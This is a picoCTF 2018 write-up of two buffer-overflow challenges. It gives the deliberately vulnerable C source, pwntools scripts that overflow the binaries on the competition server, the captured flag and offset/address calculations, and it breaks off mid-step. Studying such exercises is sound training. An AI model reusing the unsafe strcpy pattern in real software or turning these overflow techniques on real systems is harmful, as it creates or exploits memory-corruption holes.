# Binary Exploitation

### B**uffer overflow 0 - Points: 150**

> Let's start off simple, can you overflow the right buffer in this [program](https://2018shell.picoctf.com/static/bacf5fae929ccfce6eacdc51cfad3031/vuln) to get the flag? You can also find it in /problems/buffer-overflow-0\_3\_d5263c5219b334339c34ac35c51c4a17 on the shell server. [Source](https://2018shell.picoctf.com/static/bacf5fae929ccfce6eacdc51cfad3031/vuln.c).  
> Hint:   
> How can you trigger the flag to print?  
> If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.

vuln.c contents:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[16];  strcpy(buf, input);
}

int main(int argc, char **argv){

  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  if (argc > 1) {    vuln(argv[1]);
    printf("Thanks! Received: %s", argv[1]);
  }  else
    printf("This program takes 1 argument.\n");
  return 0;}
```

One way was to run the program and pass a really long \(supposedly at least 28 bytes\) string and it will print the flag on the server. Another method I wanted to use was pwntool because it gave me an opportunity to learn about the this popular program.

```c
from pwn import *

username = "tokumeipoh"

input = 'a' * 28

connection = ssh(host="2018shell.picoctf.com", user=username, password="{password}")

py = connection.run("cd /problems/buffer-overflow-0_3_d5263c5219b334339c34ac35c51c4a17; ./vuln {}".format(input))

print(py.recv())
connection.close()
```

Shell results:

```text
poh@pohSurface:/mnt/d/pradagy/projects/ctf/pico2018/buffer overflow 0$ python3 try.py 
[+] Connecting to 2018shell.picoctf.com on port 22: Done
[*] tokumeipoh@2018shell.picoctf.com:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.0
    ASLR:     Enabled
[+] Starting remote process '/bin/bash' on 2018shell.picoctf.com: pid 130175
b'picoCTF{ov3rfl0ws_ar3nt_that_bad_2d11f6cd}\n'
[*] Stopped remote process 'bash' on 2018shell.picoctf.com (pid 130175)
```

### **Buffer overflow 1 - Points: 200** 

> Okay now you're cooking! This time can you overflow the buffer and return to the flag function in this [program](https://2018shell.picoctf.com/static/f8fb1e2f61e93367783d7831e70ef1a2/vuln)? You can find it in /problems/buffer-overflow-1\_4\_9d46ad1b74894db5d4831b91e19ee709 on the shell server. [Source](https://2018shell.picoctf.com/static/f8fb1e2f61e93367783d7831e70ef1a2/vuln.c).  
> Hint: This time you're actually going to have to control that return address! Make sure you consider Big Endian vs Little Endian.

We can learn that we need to invoke the win\(\) function in order to have the flag revealed. And using cutter, I found the function address starts at 0x080485cb. Or you can use a handy linux command for quick reference:  
`objdump -x -d vuln` -x: display all available header info, -d: dissamble \(show assembly code\).  
 If you run the program with different arguments, you will get different return addresses, meaning that there is a padding for the input and then the program jumps to the overflowed input being translated to program address.

{% hint style="warning" %}
This program did not run on my pc because it is missing the asm.h file. What I had to do was run my python code to connect to the server and then conveniently used pwntools. 
{% endhint %}

I first ran this script

```python
from pwn import *

host = "2018shell.picoctf.com"
directory = "/problems/buffer-overflow-1_4_9d46ad1b74894db5d4831b91e19ee709"
conn = ssh(host=host, user="tokumeipoh")

io = conn.run(f"cd {directory}; ./vuln")
print(io.recv())
io.sendline(cyclic(100))
# cyclic(100) = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
print(io.recvall())
```

```python
[+] Connecting to 2018shell.picoctf.com on port 22: Done
[*] tokumeipoh@2018shell.picoctf.com:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.0
    ASLR:     Enabled
[+] Opening new channel: 'cd /problems/buffer-overflow-1_4_9d46ad1b74894db5d4831b91e19ee709; ./vuln': Done
b'Please enter your string: \n'
[+] Receiving all data: Done (131B)
[*] Closed SSH channel with 2018shell.picoctf.com
b'Okay, time to return... Fingers Crossed... Jumping to 0x6161616c\nbash: line 1: 704804 Segmentation fault      (core dumped) ./vuln\n'
```

This meant it read all of my input up until  `0x6161616c` and then it used that as an address to jump to next in assembly.   
1\) First of all, I needed to find out how many bytes \(letters\) it read as input until it overflowed the buffer.   
2\) Then need to find out what address we really want it to jump to, which is the win\(\).  
3\) Construct a string with proper padding and address, with little endian \(which is lsb first\).

1. This part is finding how much padding is needed by locating  `0x6161616c` in the cyclic\(100\). Use the following command in python prompt with pwn imported. This returns the number of bytes the parameter is located at when using cyclic\(n\).  
    `>>> cyclic_find(0x6161616c)`

   `44`  
   So the padding is 44 bytes.

2. In bash, view the assembly code of vuln and grep for win function:  
    `poh@pohSurface:$ objdump -x -d vuln | grep win`

   `080485cb g     F .text  00000064              win`

   `080485cb <win>:`

    `80485ed:       75 1a                   jne    8048609 <win+0x3e>`  
   Address location is at 080485cb. Use python with pwn imported to find hex value and reverse endian   
    `>>> p32(0x080485cb)`

   `b'\xcb\x85\x04\x08'`  
   little endian version is b'\x08

3. 
